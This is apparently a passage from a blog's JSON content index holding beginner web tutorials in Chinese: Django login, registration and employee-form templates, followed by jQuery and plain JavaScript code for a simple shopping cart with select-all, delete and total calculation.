&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;login&lt;/title&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/work/css/style.css&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;wrap&quot;&gt; &lt;div id=&quot;top_content&quot;&gt; &lt;div id=&quot;header&quot;&gt; &lt;div id=&quot;rightheader&quot;&gt; &lt;p&gt; 2009/11/20 &lt;br /&gt; &lt;/p&gt; &lt;/div&gt; &lt;div id=&quot;topheader&quot;&gt; &lt;h1 id=&quot;title&quot;&gt; &lt;a href=&quot;#&quot;&gt;main&lt;/a&gt; &lt;/h1&gt; &lt;/div&gt; &lt;div id=&quot;navigation&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; login &lt;/h1&gt; &lt;form action=&quot;&#123;% url &quot;work:login_logic&quot; %&#125;&quot; method=&quot;post&quot;&gt; &#123;% csrf_token %&#125; &lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; class=&quot;form_table&quot;&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; username: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;name&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; password: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;password&quot; class=&quot;inputgri&quot; name=&quot;pwd&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt; &lt;input type=&quot;submit&quot; class=&quot;button&quot; value=&quot;Submit &amp;raquo;&quot; /&gt; &lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;footer&quot;&gt; &lt;div id=&quot;footer_bg&quot;&gt; ABC@126.com &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; register.html12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;regist&lt;/title&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/work/css/style.css&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;wrap&quot;&gt; &lt;div id=&quot;top_content&quot;&gt; &lt;div id=&quot;header&quot;&gt; &lt;div id=&quot;rightheader&quot;&gt; &lt;p&gt; 2009/11/20 &lt;br /&gt; &lt;/p&gt; &lt;/div&gt; &lt;div id=&quot;topheader&quot;&gt; &lt;h1 id=&quot;title&quot;&gt; &lt;a href=&quot;#&quot;&gt;main&lt;/a&gt; &lt;/h1&gt; &lt;/div&gt; &lt;div id=&quot;navigation&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; 注册 &lt;/h1&gt; &lt;form action=&quot;&#123;% url &quot;work:regist_logic&quot; %&#125;&quot; method=&quot;post&quot;&gt; &#123;% csrf_token %&#125; &lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; class=&quot;form_table&quot;&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 用户名: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;username&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 真实姓名: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;name&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 密码: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;password&quot; class=&quot;inputgri&quot; name=&quot;pwd&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 性别: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; 男 &lt;input type=&quot;radio&quot; class=&quot;inputgri&quot; name=&quot;sex&quot; value=&quot;m&quot; checked=&quot;checked&quot;/&gt; 女 &lt;input type=&quot;radio&quot; class=&quot;inputgri&quot; name=&quot;sex&quot; value=&quot;f&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt;&#123;# &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt;#&#125;&#123;# 验证码:#&#125;&#123;# &lt;img id=&quot;num&quot; src=&quot;image&quot; /&gt;#&#125;&#123;# &lt;a href=&quot;javascript:;&quot; onclick=&quot;document.getElementById(&#x27;num&#x27;).src = &#x27;image?&#x27;+(new Date()).getTime()&quot;&gt;换一张&lt;/a&gt;#&#125;&#123;# &lt;/td&gt;#&#125; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;number&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt; &lt;input type=&quot;submit&quot; class=&quot;button&quot; value=&quot;Submit &amp;raquo;&quot; /&gt; &lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;footer&quot;&gt; &lt;div id=&quot;footer_bg&quot;&gt; ABC@126.com &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; updateEmp.html12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;update Emp&lt;/title&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/work/css/style.css&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;wrap&quot;&gt; &lt;div id=&quot;top_content&quot;&gt; &lt;div id=&quot;header&quot;&gt; &lt;div id=&quot;rightheader&quot;&gt; &lt;p&gt; 2009/11/20 &lt;br /&gt; &lt;/p&gt; &lt;/div&gt; &lt;div id=&quot;topheader&quot;&gt; &lt;h1 id=&quot;title&quot;&gt; &lt;a href=&quot;#&quot;&gt;Main&lt;/a&gt; &lt;/h1&gt; &lt;/div&gt; &lt;div id=&quot;navigation&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; update Emp info: &lt;/h1&gt; &lt;form action=&quot;&#123;% url &quot;work:updateemp_logic&quot; %&#125;?id=&#123;&#123; staff.id &#125;&#125;&quot; method=&quot;post&quot;&gt; &#123;% csrf_token %&#125; &lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; class=&quot;form_table&quot;&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; id: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot; &gt; &#123;&#123; staff.id&#125;&#125; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; name: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;name&quot; value=&quot;&#123;&#123; staff.name &#125;&#125;&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; salary: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;salary&quot; value=&quot;&#123;&#123; staff.salary &#125;&#125;&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; age: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;age&quot; value=&quot;&#123;&#123; staff.age &#125;&#125;&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt; &lt;input type=&quot;submit&quot; class=&quot;button&quot; value=&quot;Confirm&quot; /&gt; &lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;footer&quot;&gt; &lt;div id=&quot;footer_bg&quot;&gt; ABC@126.com &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; addEmp.html1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;add Emp&lt;/title&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/work/css/style.css&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;wrap&quot;&gt; &lt;div id=&quot;top_content&quot;&gt; &lt;div id=&quot;header&quot;&gt; &lt;div id=&quot;rightheader&quot;&gt; &lt;p&gt; 2009/11/20 &lt;br /&gt; &lt;/p&gt; &lt;/div&gt; &lt;div id=&quot;topheader&quot;&gt; &lt;h1 id=&quot;title&quot;&gt; &lt;a href=&quot;#&quot;&gt;Main&lt;/a&gt; &lt;/h1&gt; &lt;/div&gt; &lt;div id=&quot;navigation&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; add Emp info: &lt;/h1&gt; &lt;form action=&quot;&#123;% url &quot;work:addemp_logic&quot; %&#125;&quot; method=&quot;post&quot;&gt; &#123;% csrf_token %&#125; &lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; class=&quot;form_table&quot;&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; name: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;name&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; salary: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;salary&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; age: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;age&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt; &lt;input type=&quot;submit&quot; class=&quot;button&quot; value=&quot;Confirm&quot; /&gt; &lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;footer&quot;&gt; &lt;div id=&quot;footer_bg&quot;&gt; ABC@126.com &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt;","categories":[],"tags":[{"name":"Django","slug":"Django","permalink":"http://example.com/tags/Django/"}]},{"title":"jQuery-实现简易购物车","slug":"jQuery-实现简易购物车","date":"2020-08-16T00:43:02.000Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2020/08/16/jQuery-实现简易购物车/","permalink":"http://example.com/2020/08/16/jQuery-%E5%AE%9E%E7%8E%B0%E7%AE%80%E6%98%93%E8%B4%AD%E7%89%A9%E8%BD%A6/","excerpt":"实现简易购物车,删除,全选,合计","text":"实现简易购物车,删除,全选,合计 jQery实现简易购物车实现效果图 HTML代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;购物车&lt;/title&gt; &lt;script src=&quot;jquery-1.11.1.js&quot;&gt;&lt;/script&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;my_css.css&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;box&quot;&gt; &lt;table id=&quot;t&quot;&gt; &lt;thead&gt; &lt;tr&gt; &lt;th width=&quot;100px&quot;&gt;&lt;label&gt; &lt;input type=&quot;checkbox&quot; class=&quot;check_all_check&quot;&gt; 全选&lt;/label&gt;&lt;/th&gt; &lt;th&gt;商品&lt;/th&gt; &lt;th width=&quot;100px&quot;&gt;单价&lt;/th&gt; &lt;th&gt;数量&lt;/th&gt; &lt;th width=&quot;100px&quot;&gt;小计&lt;/th&gt; &lt;th width=&quot;100px&quot;&gt;操作&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tr&gt; &lt;td class=&quot;checkbox&quot;&gt;&lt;input type=&quot;checkbox&quot;&gt;&lt;/td&gt; &lt;td class=&quot;goods&quot;&gt;&lt;img src=&quot;1.jpg&quot; alt=&quot;图片加载失败&quot;&gt;&lt;span&gt;Casio/卡西欧 EX-TR350&lt;/span&gt;&lt;/td&gt; &lt;td class=&quot;price&quot;&gt;5999.88&lt;/td&gt; &lt;td class=&quot;count&quot;&gt;&lt;span class=&quot;reduce&quot;&gt;&lt;/span&gt; &lt;input type=&quot;button&quot; class=&quot;reduce&quot; value=&quot;-&quot;&gt; &lt;input class=&quot;count-input&quot; type=&quot;text&quot; value=&quot;1&quot; size=&quot;1px&quot;&gt; &lt;input type=&quot;button&quot; class=&quot;add&quot; value=&quot;+&quot;&gt; &lt;/td&gt; &lt;td class=&quot;subtotal&quot;&gt;5999.88&lt;/td&gt; &lt;td class=&quot;operation&quot;&gt;&lt;a class=&quot;delete&quot; href=&quot;javascript:void(0)&quot;&gt;删除&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td class=&quot;checkbox&quot;&gt;&lt;input type=&quot;checkbox&quot;&gt;&lt;/td&gt; &lt;td class=&quot;goods&quot;&gt;&lt;img src=&quot;2.jpg&quot; alt=&quot;图片加载失败&quot;&gt;&lt;span&gt;Canon/佳能 PowerShot SX50 HS&lt;/span&gt;&lt;/td&gt; &lt;td class=&quot;price&quot;&gt;3888.50&lt;/td&gt; &lt;td class=&quot;count&quot;&gt;&lt;span class=&quot;reduce&quot;&gt;&lt;/span&gt; &lt;input type=&quot;button&quot; class=&quot;reduce&quot; value=&quot;-&quot;&gt; &lt;input class=&quot;count-input&quot; type=&quot;text&quot; value=&quot;1&quot; size=&quot;1px&quot;&gt; &lt;input type=&quot;button&quot; class=&quot;add&quot; value=&quot;+&quot;&gt; &lt;/td&gt; &lt;td class=&quot;subtotal&quot;&gt;3888.50&lt;/td&gt; &lt;td class=&quot;operation&quot;&gt;&lt;a class=&quot;delete&quot; href=&quot;javascript:void(0)&quot;&gt;删除&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td class=&quot;checkbox&quot;&gt;&lt;input type=&quot;checkbox&quot;&gt;&lt;/td&gt; &lt;td class=&quot;goods&quot;&gt;&lt;img src=&quot;3.jpg&quot; alt=&quot;图片加载失败&quot;&gt;&lt;span&gt;Sony/索尼 DSC-WX300&lt;/span&gt;&lt;/td&gt; &lt;td class=&quot;price&quot;&gt;1428.50&lt;/td&gt; &lt;td class=&quot;count&quot;&gt;&lt;span class=&quot;reduce&quot;&gt;&lt;/span&gt; &lt;input type=&quot;button&quot; class=&quot;reduce&quot; value=&quot;-&quot;&gt; &lt;input class=&quot;count-input&quot; type=&quot;text&quot; value=&quot;1&quot; size=&quot;1px&quot;&gt; &lt;input type=&quot;button&quot; class=&quot;add&quot; value=&quot;+&quot;&gt; &lt;/td&gt; &lt;td class=&quot;subtotal&quot;&gt;1428.50&lt;/td&gt; &lt;td class=&quot;operation&quot;&gt;&lt;a class=&quot;delete&quot; href=&quot;javascript:void(0)&quot;&gt;删除&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td class=&quot;checkbox&quot;&gt;&lt;input type=&quot;checkbox&quot;&gt;&lt;/td&gt; &lt;td class=&quot;goods&quot;&gt;&lt;img src=&quot;4.jpg&quot; alt=&quot;图片加载失败&quot;&gt;&lt;span&gt;Fujifilm/富士 instax mini 25&lt;/span&gt;&lt;/td&gt; &lt;td class=&quot;price&quot;&gt;640.60&lt;/td&gt; &lt;td class=&quot;count&quot;&gt;&lt;span class=&quot;reduce&quot;&gt;&lt;/span&gt; &lt;input type=&quot;button&quot; class=&quot;reduce&quot; value=&quot;-&quot;&gt; &lt;input class=&quot;count-input&quot; type=&quot;text&quot; value=&quot;1&quot; size=&quot;1px&quot;&gt; &lt;input type=&quot;button&quot; class=&quot;add&quot; value=&quot;+&quot;&gt; &lt;/td&gt; &lt;td class=&quot;subtotal&quot;&gt;640.60&lt;/td&gt; &lt;td class=&quot;operation&quot;&gt;&lt;a class=&quot;delete&quot; href=&quot;javascript:void(0)&quot;&gt;删除&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td colspan=&quot;5&quot;&gt; &lt;div id=&quot;foot&quot;&gt; &lt;label&gt;&lt;input type=&quot;checkbox&quot; class=&quot;check_all_check&quot;&gt; 全选&lt;/label&gt; &lt;a id=&quot;deleteAll&quot; href=&quot;javascript:void(0)&quot;&gt;删除&lt;/a&gt; &lt;/div&gt; &lt;div id=&quot;selected&quot;&gt;已选商品&lt;span id=&quot;selectedTotal&quot;&gt;0&lt;/span&gt;件&lt;span id=&quot;hidden&quot;&gt;︽&lt;/span&gt;&lt;/div&gt; &lt;div&gt;合计：￥&lt;span id=&quot;priceTotal&quot;&gt;0&lt;/span&gt;&lt;/div&gt; &lt;/td&gt; &lt;td&gt; &lt;div onclick=&quot;getTotal();&quot;&gt;结 算&lt;/div&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/div&gt;&lt;script src=&quot;my_js.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263table &#123; margin: 0 auto; border: 1px #CADEFF solid; text-align: center; border-spacing: 0;&#125;a &#123; color: #666; text-decoration: none;&#125;th &#123; background: #e2f2ff;&#125;td &#123; text-align: center; padding: 10px; color: #444;&#125;#box table th, #box table td &#123; border: 1px solid #CADEFF; border-spacing: 0;&#125;.goods span &#123; width: 180px; margin-top: 30px; text-align: left; float: left;&#125;img &#123; width: 100px; height: 80px; margin-right: 10px; float: left;&#125;#foot &#123; float: left; margin-right: 300px;&#125;#selected &#123; float: left;&#125;.count .add, .count .reduce &#123; height: 25px; width: 17px; background: #f0f0f0; text-align: center; line-height: 25px; color: #444;&#125;.count input &#123; height: 25px; line-height: 25px; border: 1px solid #aaa; color: #343434; text-align: center; background-color: #fff;&#125;.price &#123; width: 130px;&#125;.count &#123; width: 90px;&#125; 基于jQuery的js12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879//实现小计功能$(&quot;.reduce&quot;).click(function () &#123; var count1 = $(this).next().val(); var count2 = Number(count1) - 1; //修改后的数量 if (count2 === 0) &#123; $(this).attr(&#x27;disabled&#x27;, &#x27;disabled&#x27;); alert(&quot;商品个数不能为0&quot;); $(this).parent().parent().remove(); &#125; $(this).next().val(count2); // 修改数量 var price = Number($(this).parent().prev().text()); //获取单个价格 var subtatal = Number($(this).parent().next().text()); //获取原始的默认价格 var subtatal1 = count2 * price; //计算后的价格 $(this).parent().next().text(subtatal1.toFixed(2));//修改价格 getP()&#125;);$(&quot;.add&quot;).click(function () &#123; var count1 = $(this).prev().val(); var count2 = Number(count1) + 1; //修改后的数量 $(this).prev().val(count2); //修改数量 var price = Number($(this).parent().prev().text()); //获取单个价格 var subtatal = Number($(this).parent().next().text()); //获取原始的默认价格 var subtatal1 = count2 * price; //计算后的价格 $(this).parent().next().text(subtatal1.toFixed(2)); //修改价格 getP()&#125;);//实现删除功能$(&quot;.delete&quot;).click(function () &#123; $(this).parent().parent().remove(); getP()&#125;);// 全选或不选$(&quot;.check_all_check&quot;).click(function () &#123; var checked = $(&quot;.checkbox&gt;input&quot;); //获取所有的物品选择框 console.log(checked); var sum = checked.size(); //记录选择框的大小 var attr1 = $(this).prop(&#x27;checked&#x27;); //获取全选框的属性 checked.prop(&#x27;checked&#x27;, attr1); getP()&#125;);//单选$(&quot;.checkbox&quot;).click(function () &#123; getP()&#125;);//选择删除功能$(&quot;#deleteAll&quot;).click(function () &#123; //选出已选择的需要删除的行 //遍历购物车的物品行数 var plist = $(&quot;.checkbox&gt;input&quot;); //获取购物车中的选择框 for (var i = 0; i &lt; plist.size(); i++) &#123; if ($(plist[i]).is(&quot;:checked&quot;)) &#123; $($(plist[i]).parent().parent()).remove() //被选择的执行删除整行 &#125; &#125; getP()&#125;);//遍历 计算总价与小计function getP() &#123; var plist = $(&quot;.checkbox&gt;input&quot;); //获取chekbox的选择框,用来遍历 var count = 0; //已选择数量 var number = 0; //合计价格 for (var i = 0; i &lt; plist.size(); i++) &#123; // console.log($(plist[i])); if ($(plist[i]).is(&quot;:checked&quot;)) &#123; //被选择 var subtotal = $($(plist[i]).parent().parent().children()[4]).text(); //获取单行的价格 var count1 = $($($(plist[i]).parent().parent().children()[3]).children(&#x27;input&#x27;)[1]).val(); //获取单行的数量 count += Number(count1); number += Number(subtotal); &#125; &#125; var selected = $(&quot;#selectedTotal&quot;); //获取已选择 // console.log(selected); selected.text(count); var priceTotal = $(&quot;#priceTotal&quot;); //获取已选择物品的价格 // console.log(priceTotal); priceTotal.text(number.toFixed(2));&#125;","categories":[],"tags":[{"name":"jQuery","slug":"jQuery","permalink":"http://example.com/tags/jQuery/"}]},{"title":"JavaScript-实现简易购物车","slug":"JavaScript-实现简易购物车","date":"2020-08-16T00:41:59.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/08/16/JavaScript-实现简易购物车/","permalink":"http://example.com/2020/08/16/JavaScript-%E5%AE%9E%E7%8E%B0%E7%AE%80%E6%98%93%E8%B4%AD%E7%89%A9%E8%BD%A6/","excerpt":"实现简易购物车,删除,全选,合计","text":"实现简易购物车,删除,全选,合计 JavaScript实现简易购物车实现的效果图 HTML代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;购物车&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;my_css.css&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;box&quot;&gt; &lt;table id=&quot;t&quot;&gt; &lt;thead&gt; &lt;tr&gt; &lt;th width=&quot;100px&quot;&gt;&lt;label&gt; &lt;input type=&quot;checkbox&quot; class=&quot;check-box&quot; onclick=&quot;check_all(this)&quot;&gt; 全选&lt;/label&gt;&lt;/th&gt; &lt;th&gt;商品&lt;/th&gt; &lt;th width=&quot;100px&quot;&gt;单价&lt;/th&gt; &lt;th&gt;数量&lt;/th&gt; &lt;th width=&quot;100px&quot;&gt;小计&lt;/th&gt; &lt;th width=&quot;100px&quot;&gt;操作&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tr&gt; &lt;td&gt;&lt;input class=&quot;checkbox&quot; type=&quot;checkbox&quot; onclick=&quot;check(this)&quot;&gt;&lt;/td&gt; &lt;td class=&quot;goods&quot;&gt;&lt;img src=&quot;1.jpg&quot; alt=&quot;图片加载失败&quot;&gt;&lt;span&gt;Casio/卡西欧 EX-TR350&lt;/span&gt;&lt;/td&gt; &lt;td class=&quot;price&quot;&gt;5999.88&lt;/td&gt; &lt;td class=&quot;count&quot;&gt; &lt;input type=&quot;button&quot; class=&quot;reduce&quot; value=&quot;-&quot; onclick=&quot;reduce(this)&quot;&gt; &lt;input class=&quot;count-input&quot; type=&quot;text&quot; value=&quot;1&quot; size=&quot;1px&quot;&gt; &lt;input type=&quot;button&quot; class=&quot;add&quot; value=&quot;+&quot; onclick=&quot;add(this)&quot;&gt; &lt;/td&gt; &lt;td class=&quot;subtotal&quot;&gt;5999.88&lt;/td&gt; &lt;td class=&quot;operation&quot;&gt;&lt;a class=&quot;delete&quot; href=&quot;javascript:void(0)&quot; onclick=&quot;delete1(this)&quot;&gt;删除&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;input class=&quot;checkbox&quot; type=&quot;checkbox&quot; onclick=&quot;check(this)&quot;&gt;&lt;/td&gt; &lt;td class=&quot;goods&quot;&gt;&lt;img src=&quot;2.jpg&quot; alt=&quot;图片加载失败&quot;&gt;&lt;span&gt;Canon/佳能 PowerShot SX50 HS&lt;/span&gt;&lt;/td&gt; &lt;td class=&quot;price&quot;&gt;3888.50&lt;/td&gt; &lt;td class=&quot;count&quot;&gt; &lt;input type=&quot;button&quot; class=&quot;reduce&quot; value=&quot;-&quot; onclick=&quot;reduce(this)&quot;&gt; &lt;input class=&quot;count-input&quot; type=&quot;text&quot; value=&quot;1&quot; size=&quot;1px&quot;&gt; &lt;input type=&quot;button&quot; class=&quot;add&quot; value=&quot;+&quot; onclick=&quot;add(this)&quot;&gt; &lt;/td&gt; &lt;td class=&quot;subtotal&quot;&gt;3888.50&lt;/td&gt; &lt;td class=&quot;operation&quot;&gt;&lt;a class=&quot;delete&quot; href=&quot;javascript:void(0)&quot; onclick=&quot;delete1(this)&quot;&gt;删除&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;input class=&quot;checkbox&quot; type=&quot;checkbox&quot; onclick=&quot;check(this)&quot;&gt;&lt;/td&gt; &lt;td class=&quot;goods&quot;&gt;&lt;img src=&quot;3.jpg&quot; alt=&quot;图片加载失败&quot;&gt;&lt;span&gt;Sony/索尼 DSC-WX300&lt;/span&gt;&lt;/td&gt; &lt;td class=&quot;price&quot;&gt;1428.50&lt;/td&gt; &lt;td class=&quot;count&quot;&gt; &lt;input type=&quot;button&quot; class=&quot;reduce&quot; value=&quot;-&quot; onclick=&quot;reduce(this)&quot;&gt; &lt;input class=&quot;count-input&quot; type=&quot;text&quot; value=&quot;1&quot; size=&quot;1px&quot;&gt; &lt;input type=&quot;button&quot; class=&quot;add&quot; value=&quot;+&quot; onclick=&quot;add(this)&quot;&gt; &lt;/td&gt; &lt;td class=&quot;subtotal&quot;&gt;1428.50&lt;/td&gt; &lt;td class=&quot;operation&quot;&gt;&lt;a class=&quot;delete&quot; href=&quot;javascript:void(0)&quot; onclick=&quot;delete1(this)&quot;&gt;删除&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;input class=&quot;checkbox&quot; type=&quot;checkbox&quot; onclick=&quot;check(this)&quot;&gt;&lt;/td&gt; &lt;td class=&quot;goods&quot;&gt;&lt;img src=&quot;4.jpg&quot; alt=&quot;图片加载失败&quot;&gt;&lt;span&gt;Fujifilm/富士 instax mini 25&lt;/span&gt;&lt;/td&gt; &lt;td class=&quot;price&quot;&gt;640.60&lt;/td&gt; &lt;td class=&quot;count&quot;&gt; &lt;input type=&quot;button&quot; class=&quot;reduce&quot; value=&quot;-&quot; onclick=&quot;reduce(this)&quot;&gt; &lt;input class=&quot;count-input&quot; type=&quot;text&quot; value=&quot;1&quot; size=&quot;1px&quot;&gt; &lt;input type=&quot;button&quot; class=&quot;add&quot; value=&quot;+&quot; onclick=&quot;add(this)&quot;&gt; &lt;/td&gt; &lt;td class=&quot;subtotal&quot;&gt;640.60&lt;/td&gt; &lt;td class=&quot;operation&quot;&gt;&lt;a class=&quot;delete&quot; href=&quot;javascript:void(0)&quot; 